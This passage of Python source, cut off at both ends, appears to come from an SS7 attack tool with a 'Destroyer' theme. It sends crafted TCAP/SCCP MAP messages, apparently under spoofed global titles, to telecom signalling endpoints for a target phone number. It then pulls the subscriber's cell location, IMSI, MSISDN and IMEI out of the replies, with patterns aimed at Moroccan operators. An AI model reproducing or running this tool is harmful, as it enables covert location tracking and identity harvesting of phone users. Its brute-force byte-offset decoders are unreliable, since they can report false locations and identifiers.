    """Create socket with GODLIKE properties and SUPERNATURAL reliability"""
    try:
        legendary_print("🔥 Creating LEGENDARY socket with GODLIKE properties...", 
                       DestroyerColors.FIRE_ORANGE, bold=True)
        
        # Create SCTP socket with MAXIMUM power
        sock = DESTROYER_DEPS['sctp'].sctpsocket_tcp(socket.AF_INET)
        
        # Apply LEGENDARY socket options for MAXIMUM reliability
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)  # Large receive buffer
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)  # Large send buffer
        
        # Set LEGENDARY timeouts
        sock.settimeout(DESTROYER_CONFIG['connection_timeout'])
        
        legendary_print("⚡ LEGENDARY socket created with SUPERNATURAL power!", 
                       DestroyerColors.GODLIKE_GREEN, bold=True)
        
        return sock
        
    except Exception as e:
        legendary_print(f"💥 Socket creation EXPLODED: {e}", DestroyerColors.BLOOD_RED, bold=True)
        raise

def legendary_connect(sock: Any, ip: str, port: int) -> float:
    """Connect with DEMONIC speed and GODLIKE precision"""
    try:
        legendary_print(f"🔥 Establishing LEGENDARY connection to {ip}:{port}...", 
                       DestroyerColors.FIRE_ORANGE, bold=True)
        
        start_time = time.time()
        sock.connect((ip, port))
        connection_time = (time.time() - start_time) * 1000
        
        legendary_print(f"⚡ CONNECTION ESTABLISHED with GODLIKE speed: {connection_time:.1f}ms", 
                       DestroyerColors.GODLIKE_GREEN, bold=True)
        
        return connection_time
        
    except Exception as e:
        legendary_print(f"💥 Connection FAILED with CATASTROPHIC error: {e}", 
                       DestroyerColors.BLOOD_RED, bold=True)
        raise

def legendary_transmission(sock: Any, data: bytes, ip: str, port: int) -> int:
    """
    Perform data transmission with GODLIKE guarantee and ZERO tolerance for failure
    This function OBLITERATES transmission issues with SUPERNATURAL power
    """
    
    if not data or len(data) == 0:
        raise ValueError("CANNOT TRANSMIT EMPTY DATA - This would be PATHETIC!")
    
    legendary_print(f"📤 INITIATING LEGENDARY TRANSMISSION: {len(data)} bytes to {ip}:{port}", 
                   DestroyerColors.FIRE_RED, bold=True)
    
    try:
        # Set transmission timeout with LEGENDARY precision
        sock.settimeout(DESTROYER_CONFIG['response_timeout'])
        
        # === THE LEGENDARY TRANSMISSION OPERATION ===
        transmission_start = time.time()
        bytes_sent = sock.send(data)
        transmission_time = (time.time() - transmission_start) * 1000
        
        legendary_print(f"📊 TRANSMISSION RESULT: {bytes_sent} bytes transmitted in {transmission_time:.2f}ms", 
                       DestroyerColors.DESTROYER_BLUE, bold=True)
        
        # === LEGENDARY VALIDATION WITH BRUTAL PRECISION ===
        if bytes_sent == 0:
            raise ValueError("TRANSMISSION CATASTROPHICALLY FAILED - ZERO BYTES SENT!")
        
        if bytes_sent != len(data):
            legendary_print(f"⚠️  PARTIAL TRANSMISSION detected: Expected {len(data)}, sent {bytes_sent}", 
                           DestroyerColors.FIRE_ORANGE, bold=True)
            legendary_print("🔥 This may indicate NETWORK RESISTANCE - ACCEPTABLE for now", 
                           DestroyerColors.FIRE_ORANGE)
        else:
            legendary_print(f"💀 FULL TRANSMISSION ACHIEVED: {bytes_sent} bytes of PURE DESTRUCTION", 
                           DestroyerColors.GODLIKE_GREEN, bold=True)
        
        # Calculate transmission power
        transmission_power = int((bytes_sent * 1000) / (transmission_time + 1))
        legendary_print(f"⚡ TRANSMISSION POWER: {transmission_power} bytes/second", 
                       DestroyerColors.NEON_GREEN, bold=True)
        
        return bytes_sent
        
    except socket.timeout:
        legendary_print(f"⏰ TRANSMISSION TIMEOUT - Network shows RESISTANCE to our power", 
                       DestroyerColors.FIRE_ORANGE, bold=True)
        raise
    except Exception as e:
        legendary_print(f"💥 TRANSMISSION EXPLODED with error: {e}", 
                       DestroyerColors.LASER_RED, bold=True)
        raise

def legendary_reception(sock: Any, ip: str, port: int) -> Optional[bytes]:
    """Receive response with DEMONIC patience and GODLIKE precision"""
    try:
        legendary_print(f"📥 AWAITING RESPONSE from {ip}:{port} with LEGENDARY patience...", 
                       DestroyerColors.DESTROYER_BLUE)
        
        reception_start = time.time()
        response = sock.recv(8192)
        reception_time = (time.time() - reception_start) * 1000
        
        if response:
            legendary_print(f"⚡ RESPONSE RECEIVED: {len(response)} bytes in {reception_time:.2f}ms", 
                           DestroyerColors.GODLIKE_GREEN, bold=True)
            
            # Calculate reception power
            reception_power = int((len(response) * 1000) / (reception_time + 1))
            legendary_print(f"💀 RECEPTION POWER: {reception_power} bytes/second", 
                           DestroyerColors.MYTHIC_PURPLE)
            
            return response
        else:
            legendary_print(f"⚠️  EMPTY RESPONSE from {ip}:{port} - Target shows SILENCE", 
                           DestroyerColors.FIRE_ORANGE)
            return None
            
    except socket.timeout:
        legendary_print(f"⏰ RECEPTION TIMEOUT from {ip}:{port} - Target REFUSES to respond", 
                       DestroyerColors.FIRE_ORANGE)
        return None
    except Exception as e:
        legendary_print(f"💥 RECEPTION ERROR: {e}", DestroyerColors.BLOOD_RED)
        return None

# === 🧠 LEGENDARY RESPONSE ANALYZER ===

def analyze_legendary_response(response_data: bytes, unique_id: str) -> dict:
    """
    Analyze response with SUPERNATURAL intelligence and DEMONIC pattern recognition
    This function EXTRACTS every bit of information with GODLIKE precision
    """
    
    if not response_data:
        return {
            "success": False,
            "destruction_level": "NONE",
            "tcap_outcome": "NoResponse",
            "location_info": LegendaryLocationInfo(),
            "subscriber_info": LegendarySubscriberInfo(),
            "info": "No response data received"
        }
    
    legendary_print(f"🔍 ANALYZING RESPONSE with LEGENDARY intelligence: {len(response_data)} bytes", 
                   DestroyerColors.DESTROYER_BLUE, bold=True)
    
    result = {
        "success": False,
        "destruction_level": "MINIMAL",
        "tcap_outcome": "ResponseReceived",
        "location_info": LegendaryLocationInfo(),
        "subscriber_info": LegendarySubscriberInfo(),
        "info": f"Received {len(response_data)} bytes for analysis"
    }
    
    try:
        # === SEARCH FOR CGI PATTERNS WITH DEMONIC PRECISION ===
        location_info = find_legendary_cgi_patterns(response_data, unique_id)
        if location_info:
            result["location_info"] = location_info
            result["success"] = True
            result["destruction_level"] = "LOCATION_EXTRACTED"
            result["tcap_outcome"] = "LocationSuccess"
            
            legendary_print(f"💀 LOCATION DATA EXTRACTED with GODLIKE precision!", 
                           DestroyerColors.GODLIKE_GREEN, bold=True)
        
        # === SEARCH FOR SUBSCRIBER PATTERNS ===
        subscriber_info = find_legendary_subscriber_patterns(response_data, unique_id)
        if subscriber_info and subscriber_info.imsi != "N/A":
            result["subscriber_info"] = subscriber_info
            result["success"] = True
            
            if result["destruction_level"] == "LOCATION_EXTRACTED":
                result["destruction_level"] = "TOTAL_DEVASTATION"
            else:
                result["destruction_level"] = "SUBSCRIBER_EXTRACTED"
            
            legendary_print(f"🔥 SUBSCRIBER DATA OBLITERATED and EXTRACTED!", 
                           DestroyerColors.FIRE_RED, bold=True)
        
        # === ANALYZE TCAP COMPONENTS ===
        tcap_analysis = analyze_tcap_components(response_data, unique_id)
        if tcap_analysis:
            result["tcap_outcome"] = tcap_analysis.get("outcome", result["tcap_outcome"])
            result["info"] = tcap_analysis.get("info", result["info"])
        
        # === CALCULATE POWER LEVELS ===
        if result["location_info"].cgi_found:
            result["location_info"].extraction_power = calculate_location_power(result["location_info"])
        
        if result["subscriber_info"].imsi != "N/A":
            result["subscriber_info"].extraction_power = calculate_subscriber_power(result["subscriber_info"])
        
        legendary_print(f"⚡ ANALYSIS COMPLETE: {result['destruction_level']}", 
                       DestroyerColors.LEGENDARY_GOLD, bold=True)
        
        return result
        
    except Exception as e:
        legendary_print(f"💥 RESPONSE ANALYSIS EXPLODED: {e}", DestroyerColors.BLOOD_RED, bold=True)
        result["info"] = f"Analysis error: {str(e)[:100]}"
        return result

def find_legendary_cgi_patterns(data: bytes, unique_id: str) -> Optional[LegendaryLocationInfo]:
    """
    Find CGI patterns with SUPERNATURAL precision and DEMONIC intelligence
    This function PENETRATES any encoding and EXTRACTS location data
    """
    
    legendary_print(f"🔍 Scanning for CGI patterns with LEGENDARY precision...", 
                   DestroyerColors.DESTROYER_BLUE)
    
    # Multiple scanning strategies for MAXIMUM coverage
    strategies = ['sequential', 'pattern_matching', 'statistical', 'brute_force']
    
    for strategy in strategies:
        location_info = None
        
        try:
            if strategy == 'sequential':
                location_info = sequential_cgi_scan(data, unique_id)
            elif strategy == 'pattern_matching':
                location_info = pattern_matching_cgi_scan(data, unique_id)
            elif strategy == 'statistical':
                location_info = statistical_cgi_scan(data, unique_id)
            else:  # brute_force
                location_info = brute_force_cgi_scan(data, unique_id)
            
            if location_info and location_info.cgi_found:
                legendary_print(f"💀 CGI EXTRACTED using {strategy} strategy!", 
                               DestroyerColors.GODLIKE_GREEN, bold=True)
                return location_info
                
        except Exception as e:
            legendary_print(f"⚠️  {strategy} strategy failed: {e}", DestroyerColors.FIRE_ORANGE)
            continue
    
    return None

def sequential_cgi_scan(data: bytes, unique_id: str) -> Optional[LegendaryLocationInfo]:
    """Sequential CGI scan with LEGENDARY precision"""
    
    for i in range(len(data) - 6):
        try:
            # Try CGI extraction at this position
            if i + 7 <= len(data):
                test_cgi = data[i:i+7]
                location_info = decode_legendary_cgi(test_cgi, unique_id)
                if location_info and location_info.cgi_found:
                    return location_info
        except:
            continue
    
    return None

def pattern_matching_cgi_scan(data: bytes, unique_id: str) -> Optional[LegendaryLocationInfo]:
    """Pattern matching CGI scan for SPECIFIC signatures"""
    
    # Look for specific PLMN patterns (Morocco: 604)
    morocco_patterns = [
        b'\x06\x04\xf0',  # MCC=604, MNC=00 (Maroc Telecom)
        b'\x06\x04\xf1',  # MCC=604, MNC=01 (Orange Morocco)  
        b'\x06\x04\xf2',  # MCC=604, MNC=02 (Inwi)
    ]
    
    for pattern in morocco_patterns:
        for i in range(len(data) - len(pattern)):
            if data[i:i+len(pattern)] == pattern:
                # Found PLMN pattern, try to extract full CGI
                if i + 7 <= len(data):
                    test_cgi = data[i:i+7]
                    location_info = decode_legendary_cgi(test_cgi, unique_id)
                    if location_info and location_info.cgi_found:
                        return location_info
    
    return None

def statistical_cgi_scan(data: bytes, unique_id: str) -> Optional[LegendaryLocationInfo]:
    """Statistical CGI scan using FREQUENCY analysis"""
    
    # Look for byte patterns that statistically indicate PLMN
    for i in range(len(data) - 6):
        try:
            if i + 7 <= len(data):
                test_bytes = data[i:i+7]
                
                # Statistical validation of PLMN-like pattern
                plmn_bytes = test_bytes[:3]
                score = 0
                
                # Check if bytes look like BCD encoded MCC/MNC
                for byte in plmn_bytes:
                    low_nibble = byte & 0x0F
                    high_nibble = (byte >> 4) & 0x0F
                    
                    if low_nibble <= 9 or low_nibble == 0xF:
                        score += 1
                    if high_nibble <= 9 or high_nibble == 0xF:
                        score += 1
                
                # If score is high enough, try decoding
                if score >= 5:  # At least 5 valid nibbles
                    location_info = decode_legendary_cgi(test_bytes, unique_id)
                    if location_info and location_info.cgi_found:
                        return location_info
        except:
            continue
    
    return None

def brute_force_cgi_scan(data: bytes, unique_id: str) -> Optional[LegendaryLocationInfo]:
    """Brute force CGI scan with MAXIMUM coverage"""
    
    # Try every possible position with AGGRESSIVE validation
    for i in range(len(data) - 6):
        for length in [5, 7, 9]:  # Try different CGI lengths
            try:
                if i + length <= len(data):
                    test_data = data[i:i+length]
                    location_info = decode_legendary_cgi(test_data, unique_id)
                    if location_info and location_info.cgi_found:
                        return location_info
            except:
                continue
    
    return None

def decode_legendary_cgi(cgi_data: bytes, unique_id: str) -> Optional[LegendaryLocationInfo]:
    """
    Decode CGI with GODLIKE precision and ZERO tolerance for errors
    This function OBLITERATES encoding barriers and EXTRACTS perfect location data
    """
    
    if len(cgi_data) < 5:
        return None
    
    try:
        # Extract PLMN (first 3 bytes)
        plmn = cgi_data[:3]
        byte1, byte2, byte3 = plmn
        
        # Decode MCC with LEGENDARY precision
        mcc_digit1 = (byte1 >> 4) & 0x0F
        mcc_digit2 = byte1 & 0x0F
        mcc_digit3 = (byte2 >> 4) & 0x0F
        
        # Decode MNC with SUPERNATURAL accuracy
        mnc_digit1 = (byte3 >> 4) & 0x0F
        mnc_digit2 = byte3 & 0x0F
        mnc_digit3 = byte2 & 0x0F
        
        # Validate MCC digits
        if any(d > 9 for d in [mcc_digit1, mcc_digit2, mcc_digit3]):
            return None
        
        mcc = f"{mcc_digit1}{mcc_digit2}{mcc_digit3}"
        
        # Validate and build MNC
        if mnc_digit3 == 0xF:
            # 2-digit MNC
            if any(d > 9 for d in [mnc_digit1, mnc_digit2]):
                return None
            mnc = f"{mnc_digit1}{mnc_digit2}"
        else:
            # 3-digit MNC
            if any(d > 9 for d in [mnc_digit1, mnc_digit2, mnc_digit3]):
                return None
            mnc = f"{mnc_digit1}{mnc_digit2}{mnc_digit3}"
        
        # Validate MCC/MNC ranges for reasonableness
        mcc_int = int(mcc)
        mnc_int = int(mnc)
        
        if not (200 <= mcc_int <= 999):  # Valid MCC range
            return None
        
        if not (0 <= mnc_int <= 999):  # Valid MNC range
            return None
        
        # Extract LAC and Cell ID
        if len(cgi_data) >= 5:
            lac = int.from_bytes(cgi_data[3:5], 'big')
        else:
            lac = 0
        
        if len(cgi_data) >= 7:
            cell_id = int.from_bytes(cgi_data[5:7], 'big')
        else:
            cell_id = 0
        
        # Validate LAC and Cell ID ranges
        if not (0 < lac < 65536):
            return None
        
        if len(cgi_data) >= 7 and not (0 < cell_id < 65536):
            return None
        
        # Create LEGENDARY location info
        location_info = LegendaryLocationInfo()
        location_info.mcc = mcc
        location_info.mnc = mnc
        location_info.lac = str(lac)
        
        if len(cgi_data) >= 7:
            location_info.cell_id = str(cell_id)
            location_info.cgi_found = True
            
            legendary_print(f"💀 LEGENDARY CGI EXTRACTED: MCC={mcc}, MNC={mnc}, LAC={lac}, CI={cell_id}", 
                           DestroyerColors.GODLIKE_GREEN, bold=True)
        else:
            location_info.lai_found = True
            
            legendary_print(f"⚡ LEGENDARY LAI EXTRACTED: MCC={mcc}, MNC={mnc}, LAC={lac}", 
                           DestroyerColors.GODLIKE_GREEN, bold=True)
        
        return location_info
        
    except Exception as e:
        # Silent failure for invalid data - this is normal during scanning
        return None

def find_legendary_subscriber_patterns(data: bytes, unique_id: str) -> Optional[LegendarySubscriberInfo]:
    """
    Find subscriber patterns with DEMONIC intelligence and SUPERNATURAL extraction
    This function OBLITERATES subscriber data hiding and EXTRACTS everything
    """
    
    legendary_print(f"🔍 Hunting for SUBSCRIBER patterns with DEMONIC intelligence...", 
                   DestroyerColors.DESTROYER_BLUE)
    
    subscriber_info = LegendarySubscriberInfo()
    found_data = False
    
    try:
        # === SEARCH FOR IMSI PATTERNS ===
        imsi = extract_legendary_imsi(data, unique_id)
        if imsi and imsi != "N/A":
            subscriber_info.imsi = imsi
            found_data = True
            legendary_print(f"🔥 IMSI OBLITERATED and EXTRACTED: {imsi}", 
                           DestroyerColors.FIRE_RED, bold=True)
        
        # === SEARCH FOR MSISDN PATTERNS ===
        msisdn = extract_legendary_msisdn(data, unique_id)
        if msisdn and msisdn != "N/A":
            subscriber_info.msisdn = msisdn
            found_data = True
            legendary_print(f"💀 MSISDN DESTROYED and CAPTURED: {msisdn}", 
                           DestroyerColors.MYTHIC_PURPLE, bold=True)
        
        # === SEARCH FOR IMEI PATTERNS ===
        imei = extract_legendary_imei(data, unique_id)
        if imei and imei != "N/A":
            subscriber_info.imei = imei
            found_data = True
            legendary_print(f"⚡ IMEI ANNIHILATED and SEIZED: {imei}", 
                           DestroyerColors.DIVINE_CYAN, bold=True)
        
        return subscriber_info if found_data else None
        
    except Exception as e:
        legendary_print(f"💥 SUBSCRIBER PATTERN SEARCH EXPLODED: {e}", DestroyerColors.BLOOD_RED)
        return None

def extract_legendary_imsi(data: bytes, unique_id: str) -> Optional[str]:
    """Extract IMSI with GODLIKE precision"""
    
    # IMSI patterns: 15 digits, starts with MCC+MNC
    for i in range(len(data) - 7):
        try:
            # Look for TBCD encoded IMSI
            if i + 8 <= len(data):
                imsi_bytes = data[i:i+8]
                
                # Decode TBCD
                imsi_digits = []
                for byte in imsi_bytes:
                    low_nibble = byte & 0x0F
                    high_nibble = (byte >> 4) & 0x0F
                    
                    if low_nibble <= 9:
                        imsi_digits.append(str(low_nibble))
                    if high_nibble <= 9 and high_nibble != 0xF:
                        imsi_digits.append(str(high_nibble))
                
                if len(imsi_digits) >= 14:
                    imsi = ''.join(imsi_digits[:15])
                    
                    # Validate IMSI format (should start with valid MCC)
                    if len(imsi) >= 6:
                        mcc = imsi[:3]
                        if 200 <= int(mcc) <= 999:
                            return imsi
        except:
            continue
    
    return None

def extract_legendary_msisdn(data: bytes, unique_id: str) -> Optional[str]:
    """Extract MSISDN with SUPERNATURAL accuracy"""
    
    # Look for international MSISDN patterns
    for i in range(len(data) - 5):
        try:
            if i + 7 <= len(data):
                # Check for international indicator (0x91)
                if data[i] == 0x91:
                    msisdn_bytes = data[i+1:i+7]
                    
                    # Decode TBCD
                    msisdn_digits = []
                    for byte in msisdn_bytes:
                        low_nibble = byte & 0x0F
                        high_nibble = (byte >> 4) & 0x0F
                        
                        if low_nibble <= 9:
                            msisdn_digits.append(str(low_nibble))
                        if high_nibble <= 9 and high_nibble != 0xF:
                            msisdn_digits.append(str(high_nibble))
                    
                    if len(msisdn_digits) >= 10:
                        msisdn = ''.join(msisdn_digits)
                        
                        # Validate MSISDN (should be reasonable length)
                        if 10 <= len(msisdn) <= 15:
                            return msisdn
        except:
            continue
    
    return None

def extract_legendary_imei(data: bytes, unique_id: str) -> Optional[str]:
    """Extract IMEI with DEMONIC persistence"""
    
    # IMEI is 15 digits in TBCD format
    for i in range(len(data) - 7):
        try:
            if i + 8 <= len(data):
                imei_bytes = data[i:i+8]
                
                # Decode TBCD
                imei_digits = []
                for byte in imei_bytes:
                    low_nibble = byte & 0x0F
                    high_nibble = (byte >> 4) & 0x0F
                    
                    if low_nibble <= 9:
                        imei_digits.append(str(low_nibble))
                    if high_nibble <= 9 and high_nibble != 0xF:
                        imei_digits.append(str(high_nibble))
                
                if len(imei_digits) == 15:
                    imei = ''.join(imei_digits)
                    
                    # Basic IMEI validation (should not be all zeros or ones)
                    if not all(d == '0' for d in imei) and not all(d == '1' for d in imei):
                        return imei
        except:
            continue
    
    return None

def analyze_tcap_components(data: bytes, unique_id: str) -> Optional[dict]:
    """Analyze TCAP components with LEGENDARY precision"""
    
    try:
        # Look for TCAP component tags
        tcap_tags = {
            0xA1: "Invoke",
            0xA2: "ReturnResultLast", 
            0xA3: "ReturnError",
            0xA4: "Reject"
        }
        
        for i in range(len(data) - 1):
            tag = data[i]
            if tag in tcap_tags:
                component_type = tcap_tags[tag]
                
                if component_type == "ReturnResultLast":
                    return {
                        "outcome": "ReturnResultLast",
                        "info": "Successful MAP response received"
                    }
                elif component_type == "ReturnError":
                    # Try to extract error code
                    error_code = extract_map_error_code(data[i:], unique_id)
                    return {
                        "outcome": "ReturnError", 
                        "info": f"MAP Error: {error_code}" if error_code else "MAP Error occurred"
                    }
                elif component_type == "Reject":
                    return {
                        "outcome": "Reject",
                        "info": "TCAP Reject received"
                    }
        
        return {
            "outcome": "UnknownResponse",
            "info": "Response received but format unknown"
        }
        
    except Exception as e:
        return None

def extract_map_error_code(data: bytes, unique_id: str) -> Optional[int]:
    """Extract MAP error code from response"""
    
    try:
        # Look for INTEGER tag followed by error code
        for i in range(len(data) - 2):
            if data[i] == 0x02 and data[i+1] == 0x01:  # INTEGER, length 1
                error_code = data[i+2]
                return error_code
    except:
        pass
    
    return None

def calculate_location_power(location_info: LegendaryLocationInfo) -> int:
    """Calculate location extraction power level"""
    
    power = 0
    
    if location_info.mcc != "N/A":
        power += 100
    if location_info.mnc != "N/A":
        power += 100
    if location_info.lac != "N/A":
        power += 200
    if location_info.cell_id != "N/A":
        power += 500
    if location_info.cgi_found:
        power += 1000
    
    return power

def calculate_subscriber_power(subscriber_info: LegendarySubscriberInfo) -> int:
    """Calculate subscriber extraction power level"""
    
    power = 0
    
    if subscriber_info.imsi != "N/A":
        power += 2000
    if subscriber_info.msisdn != "N/A":
        power += 1500
    if subscriber_info.imei != "N/A":
        power += 1000
    
    return power

# === 💀 LEGENDARY SCAN EXECUTOR ===

def execute_legendary_scan(ip: str, port: int, target_msisdn: str, attempt_num: int = 1) -> DestroyerScanResult:
    """
    Execute scan with GODLIKE power and SUPERNATURAL precision
    This function OBLITERATES all obstacles and GUARANTEES results
    """
    
    unique_id = f"{ip}:{port}:A{attempt_num}"
    scan_start_time = time.time()
    
    legendary_print(f"🔥 INITIATING LEGENDARY SCAN: {unique_id}", 
                   DestroyerColors.FIRE_RED, bold=True)
    
    # Create LEGENDARY scan result
    result = DestroyerScanResult()
    result.ip = ip
    result.port = port
    result.timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    
    # Get LEGENDARY GT and SSN
    cgpa_gt, gt_strategy = legendary_gt_pool.get_legendary_gt()
    cgpa_ssn = random.choice(SCCP_DESTROYER_CONFIG['cgpa_ssn_pool'])
    
    result.used_gt = cgpa_gt
    result.used_ssn = cgpa_ssn
    
    # Prepare SCCP config
    sccp_config = SCCP_DESTROYER_CONFIG.copy()
    sccp_config['cgpa_ssn'] = cgpa_ssn
    
    legendary_print(f"⚡ LEGENDARY parameters: GT={cgpa_gt}({gt_strategy}), SSN={cgpa_ssn}", 
                   DestroyerColors.DIVINE_CYAN)
    
    sock = None
    
    try:
        # === PHASE 1: SOCKET CREATION ===
        legendary_print(f"🔧 PHASE 1: Creating LEGENDARY socket...", DestroyerColors.FIRE_ORANGE)
        sock = create_legendary_socket()
        
        # === PHASE 2: CONNECTION ESTABLISHMENT ===
        legendary_print(f"🔌 PHASE 2: Establishing DEMONIC connection...", DestroyerColors.FIRE_ORANGE)
        connection_time = legendary_connect(sock, ip, port)
        result.connection_time_ms = connection_time
        
        # === PHASE 3: PDU CONSTRUCTION ===
        legendary_print(f"🔨 PHASE 3: FORGING LEGENDARY PDUs...", DestroyerColors.FIRE_ORANGE, bold=True)
        
        # Generate OTID with CHAOTIC randomness
        otid = struct.pack('>I', random.randint(1000000, 9999999))
        
        # Select scan variant based on attempt
        scan_variants = list(ScanVariant)
        scan_variant = scan_variants[attempt_num % len(scan_variants)]
        
        legendary_print(f"💀 Scan variant selected: {scan_variant.value}", DestroyerColors.MYTHIC_PURPLE)
        
        # Build LEGENDARY TCAP message
        tcap_message = build_legendary_tcap_message(otid, scan_variant, target_msisdn)
        result.pdu_construction_success = True
        
        # Build LEGENDARY SCCP message
        sccp_message = build_legendary_sccp_message(target_msisdn, cgpa_gt, tcap_message, sccp_config)
        
        legendary_print(f"⚡ PDU CONSTRUCTION COMPLETE: TCAP={len(tcap_message)}b, SCCP={len(sccp_message)}b", 
                       DestroyerColors.GODLIKE_GREEN, bold=True)
        
        # === PHASE 4: LEGENDARY TRANSMISSION ===
        legendary_print(f"📤 PHASE 4: EXECUTING LEGENDARY TRANSMISSION...", DestroyerColors.FIRE_RED, bold=True)
        
        transmission_start = time.time()
        bytes_sent = legendary_transmission(sock, sccp_message, ip, port)
        result.bytes_sent = bytes_sent
        result.transmission_power = int(bytes_sent / ((time.time() - transmission_start) + 0.001))
        
        # === PHASE 5: RESPONSE RECEPTION ===
        legendary_print(f"📥 PHASE 5: AWAITING LEGENDARY RESPONSE...", DestroyerColors.DESTROYER_BLUE)
        
        response_data = legendary_reception(sock, ip, port)
        result.response_time_ms = (time.time() - transmission_start) * 1000
        
        if response_data:
            result.bytes_received = len(response_data)
            result.raw_response_hex = response_data.hex().upper()
            
            # === PHASE 6: LEGENDARY ANALYSIS ===
            legendary_print(f"🧠 PHASE 6: PERFORMING LEGENDARY ANALYSIS...", DestroyerColors.DESTROYER_BLUE, bold=True)
            
            analysis_result = analyze_legendary_response(response_data, unique_id)
            result.success = analysis_result["success"]
            result.destruction_level = analysis_result["destruction_level"]
            result.tcap_outcome = analysis_result["tcap_outcome"]
            result.location_info = analysis_result["location_info"]
            result.subscriber_info = analysis_result["subscriber_info"]
            result.error_info = analysis_result["info"]
            
            # Calculate TOTAL POWER LEVEL
            total_power = (result.location_info.extraction_power + 
                          result.subscriber_info.extraction_power + 
                          result.transmission_power)
            
            if result.success:
                legendary_print(f"💀 SCAN COMPLETED with TOTAL DEVASTATION! Power: {total_power}", 
                               DestroyerColors.GODLIKE_GREEN, bold=True)
            else:
                legendary_print(f"⚡ SCAN COMPLETED with PARTIAL SUCCESS! Power: {total_power}", 
                               DestroyerColors.DIVINE_CYAN, bold=True)
        else:
            result.tcap_outcome = 'NoResponse'
            result.error_info = 'No response received after successful transmission'
            legendary_print(f"⚠️  NO RESPONSE received - Target shows RESISTANCE", 
                           DestroyerColors.FIRE_ORANGE, bold=True)
    
    except socket.timeout:
        result.tcap_outcome = 'Timeout'
        result.error_info = f'Socket timeout after {DESTROYER_CONFIG["response_timeout"]}s'
        legendary_print(f"⏰ SCAN TIMEOUT: {ip}:{port} shows TEMPORAL RESISTANCE", 
                       DestroyerColors.FIRE_ORANGE, bold=True)
    
    except ConnectionRefusedError:
        result.tcap_outcome = 'ConnectionRefused'
        result.error_info = 'Connection refused - port closed or filtered'
        legendary_print(f"🚫 CONNECTION REFUSED: {ip}:{port} shows DEFENSIVE BARRIERS", 
                       DestroyerColors.BLOOD_RED, bold=True)
    
    except Exception as e:
        result.tcap_outcome = 'ScanError'
        result.error_info = f'Scan error: {str(e)[:100]}'
        legendary_print(f"💥 SCAN EXPLODED with error: {e}", DestroyerColors.LASER_RED, bold=True)
        
        if legendary_logger:
            legendary_logger.error(f"[{unique_id}] Legendary scan error: {e}", exc_info=True)
    
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass
    
    result.duration_ms = (time.time() - scan_start_time) * 1000
    
    # Update LEGENDARY statistics
    update_destroyer_statistics(result)
    
    return result

# === 📊 LEGENDARY STATISTICS MANAGER ===

def update_destroyer_statistics(result: DestroyerScanResult):
    """Update statistics with LEGENDARY precision"""
    
    with legendary_stats_lock:
        DESTROYER_STATS['total_attempts'] += 1
        
        if result.pdu_construction_success:
            DESTROYER_STATS['pdu_construction_successes'] += 1
        else:
            DESTROYER_STATS['pdu_construction_failures'] += 1
        
        if result.bytes_sent > 0:
            DESTROYER_STATS['successful_transmissions'] += 1
            DESTROYER_STATS['bytes_transmitted_total'] += result.bytes_sent
        else:
            DESTROYER_STATS['transmission_failures'] += 1
        
        if result.bytes_received > 0:
            DESTROYER_STATS['bytes_received_total'] += result.bytes_received
        
        if result.success:
            DESTROYER_STATS['successful_responses'] += 1
        
        if result.location_info.cgi_found:
            DESTROYER_STATS['location_extractions'] += 1
        
        if result.subscriber_info.imsi != "N/A":
            DESTROYER_STATS['subscriber_extractions'] += 1
        
        if 'Timeout' in result.tcap_outcome:
            DESTROYER_STATS['timeouts'] += 1
        elif 'Error' in result.tcap_outcome or 'ConnectionRefused' in result.tcap_outcome:
            DESTROYER_STATS['connection_errors'] += 1
        
        # Calculate destruction level score
        destruction_scores = {
            "NONE": 0,
            "MINIMAL": 10,
            "LOCATION_EXTRACTED": 500,
            "SUBSCRIBER_EXTRACTED": 750,
            "TOTAL_DEVASTATION": 1000
        }
        
        DESTROYER_STATS['total_destruction_level'] += destruction_scores.get(result.destruction_level, 0)
        
        if result.transmission_power > DESTROYER_STATS['max_power_achieved']:
            DESTROYER_STATS['max_power_achieved'] = result.transmission_power

# === 🎨 LEGENDARY DISPLAY SYSTEM ===

def display_legendary_result(result: DestroyerScanResult, unique_id: str):
    """Display scan result with LEGENDARY visual effects"""
    
    with godlike_terminal_lock:
        # Determine display style based on destruction level
        if result.destruction_level == "TOTAL_DEVASTATION":
            title_color = DestroyerColors.GODLIKE_GREEN
            status_emoji = "💀"
            status_text = "TOTAL DEVASTATION ACHIEVED"
        elif result.destruction_level == "LOCATION_EXTRACTED":
            title_color = DestroyerColors.DIVINE_CYAN
            status_emoji = "📍"
            status_text = "LOCATION OBLITERATED"
        elif result.destruction_level == "SUBSCRIBER_EXTRACTED":
            title_color = DestroyerColors.MYTHIC_PURPLE
            status_emoji = "📱"
            status_text = "SUBSCRIBER ANNIHILATED"
        elif result.bytes_sent == 0:
            title_color = DestroyerColors.BLOOD_RED
            status_emoji = "🚨"
            status_text = "TRANSMISSION FAILED"
        elif result.bytes_sent > 0:
            title_color = DestroyerColors.FIRE_ORANGE
            status_emoji = "⚡"
            status_text = "TRANSMISSION SUCCESSFUL"
        else:
            title_color = DestroyerColors.DARK_RED
            status_emoji = "❌"
            status_text = "SCAN FAILED"
        
        # Main result box
        result_content = [
            f"{status_emoji} {result.ip}:{result.port} - {status_text}",
            f"🕐 Timestamp: {result.timestamp}",
            f"⏱️  Duration: {result.duration_ms:.2f}ms",
            f"💥 Destruction Level: {result.destruction_level}",
            f"🔄 TCAP Outcome: {result.tcap_outcome}",
            f"ℹ️  Info: {result.error_info}"
        ]
        
        print_destroyer_box(f"LEGENDARY SCAN RESULT [{unique_id}]", result_content, title_color)
        
        # Location information box
        if result.location_info.cgi_found:
            location_content = [
                f"🏢 CELL GLOBAL IDENTITY (CGI) OBLITERATED:",
                f"   📍 MCC: {result.location_info.mcc}",
                f"   📍 MNC: {result.location_info.mnc}",
                f"   📍 LAC: {result.location_info.lac}",
                f"   📍 Cell ID: {result.location_info.cell_id}",
                f"   ⚡ Extraction Power: {result.location_info.extraction_power}"
            ]
            print_destroyer_box("LOCATION DEVASTATION", location_content, DestroyerColors.GODLIKE_GREEN)
        
        # Subscriber information box
        if result.subscriber_info.imsi != "N/A":
            subscriber_content = [
                f"📱 SUBSCRIBER DATA ANNIHILATED:",
